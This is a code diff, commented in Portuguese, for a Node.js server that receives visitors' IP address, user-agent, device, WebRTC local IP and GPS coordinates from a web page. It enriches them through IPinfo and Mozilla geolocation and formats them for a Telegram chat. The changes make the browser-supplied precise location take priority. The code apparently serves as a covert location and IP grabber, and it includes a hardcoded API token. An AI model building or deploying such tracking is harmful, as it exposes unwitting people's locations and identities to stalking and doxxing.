@@ -4,7 +4,7 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Variáveis de ambiente (Render ou .env)
+// Variáveis de ambiente (.env ou Render)
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
@@ -19,7 +19,6 @@ app.post('/log', async (req, res) => {
   const data = req.body;
   console.log("📥 Dados recebidos do front:", data);
 
-  // Verifica se o bot está configurado
   if (!botToken || !chatId) {
     console.error("❌ BOT_TOKEN ou CHAT_ID não definidos!");
     return res.status(500).send("Bot não configurado.");
@@ -27,7 +26,7 @@ app.post('/log', async (req, res) => {
 
   let preciseLoc = null;
 
-  // Localização baseada em IP (Mozilla Location Service)
+  // Localização via Mozilla (fallback caso GPS falhe)
   try {
     const mlsRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
       method: "POST",
@@ -42,7 +41,7 @@ app.post('/log', async (req, res) => {
     console.warn("⚠️ Mozilla Location Service falhou:", mlsErr);
   }
 
-  // Dados do IP via IPinfo
+  // Dados via IPinfo
   try {
     const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
     const ipInfo = await ipResponse.json();
@@ -56,7 +55,7 @@ app.post('/log', async (req, res) => {
 🏢 *ISP:* ${ipInfo.org || "N/A"}
 🕵️‍♂️ *User-Agent:* \`${data.userAgent || "N/A"}\`
 📱 *Dispositivo:* \`${data.device || "N/A"}\`
-📌 *Lat/Long:* ${preciseLoc || ipInfo.loc || "Indisponível"}
+📌 *Lat/Long:* ${data.loc || preciseLoc || ipInfo.loc || "Indisponível"}
 🌐 *IP Local (WebRTC):* \`${data.localIP || "N/A"}\`
 `;
 
